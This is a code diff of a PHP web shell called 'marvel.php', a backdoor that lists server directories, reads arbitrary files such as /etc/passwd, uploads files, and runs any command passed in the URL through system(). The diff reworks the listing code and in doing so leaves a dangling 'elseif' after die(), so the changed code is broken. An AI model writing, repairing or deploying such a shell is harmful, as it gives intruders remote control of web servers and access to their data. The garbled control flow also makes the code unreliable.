@@ -18,39 +18,38 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])){
 	}
 }
 
-if(isset($_GET['act']) && $_GET['act'] == "ls"){
+
+if(isset($_GET['d'])){
 	$dx = $_GET['d'];
-	if(empty($dx)){
-		die("<font face='Courier New'>[!] Enter specified directory!</font>");
-	}
-	echo "<pre>";
-	if($buka = opendir("$dx")){
-		echo "<h2>Listing $dx</h2>";
-		while($sken = readdir($buka)){
-			if(is_dir("$dx/$sken")){
-				echo "<a href=\"".$_SERVER['PHP_SELF']."?act=ls&d=$dx/$sken\"><font color='red'>";
-			}
-			else {
-				echo "<a href=\"".$_SERVER['PHP_SELF']."?f=$dx/$sken\"><font color='black'>";
-			}
-			echo "$sken\n";
-			echo "</font></a>";
-		}
-	}
-	else {
-		echo "opendir() failed";
-	}
-	closedir($buka);
-	die("<hr>");
+	chdir($dx);
+}
+else {
+	$dx = getcwd();
 }
 
-elseif(isset($_GET['f'])){
-	$filename=$_GET['f'];
-	$file = @fopen("$filename","r");
-	while(!feof($file)){
-		echo htmlspecialchars(fgets($file))."<br>";
+echo "<pre>";
+if($buka = opendir("$dx")){
+	echo "<h2>Listing $dx</h2>";
+	while($sken = readdir($buka)){
+		if(is_dir("$dx/$sken")){
+			echo "<a href=\"?d=$dx/$sken\"><font color='red'>";
+		}
+		else {
+			echo "<a href=\"?f=$dx/$sken\"><font color='black'>";
+		}
+		echo "$sken\n";
+		echo "</font></a>";
 	}
-	@fclose($file);
+}
+else {
+	echo "opendir() failed";
+}
+closedir($buka);
+die("<hr>");
+
+
+elseif(isset($_GET['f'])){
+	echo "<pre>".htmlspecialchars(file_get_contents($_GET['f']))."</pre>";
 	die;
 }
 
@@ -91,23 +90,9 @@ if(isset($_POST['send'])){
 }
 }
 
-elseif(isset($_GET['act']) && $_GET['act'] == "image"){
-	@ob_clean();
-	$img = $_GET['img'];
-	$inf = @getimagesize($img);
-	$ext = explode($img, ".");
-	$ext = $ext[count($ext) - 1];
-	@header("Content-type: " . $inf["mime"]);
-	@header("Cache-control: public");
-	@header("Expires: " . date("r", mktime(0, 0, 0, 1, 1, 2030)));
-	@header("Cache-control: max-age=" . (60 * 60 * 24 * 7));
-	@readfile($img);
-	exit;
-}
-
 elseif(isset($_GET['act']) && $_GET['act'] == "shell"){
 	if(empty($_GET['cmd'])){
-		die("<font face='Courier New'>[!] Enter specified command, ex: uname -a for linux, ver for windows</font>");
+		die("<font face='Courier New'>[!] Enter specified command, ex: uname -a; for linux, ver; for windows</font>");
 	}
 	echo "<pre>";
 	system($_GET['cmd']);
@@ -123,12 +108,9 @@ elseif(isset($_GET['act']) && $_GET['act'] == "help"){
 -- Codename: Doctor Fate            --
 --------------------------------------</center>
 
-Use: "marvel.php?act=ls&amp;d=/var/www" for listing file &amp; folder
-Use: "marvel.php?f=/etc/passwd" for see the file
 Use: "marvel.php?act=upload" for uploading files
 Use: "marvel.php?act=shell&amp;cmd=uname -a" for shell
 Use: "marvel.php?act=help" for print this text
-Use: "marvel.php?act=image&amp;img=/folder/blah.jpg" for viewing image
 </pre>
 <?php
 }
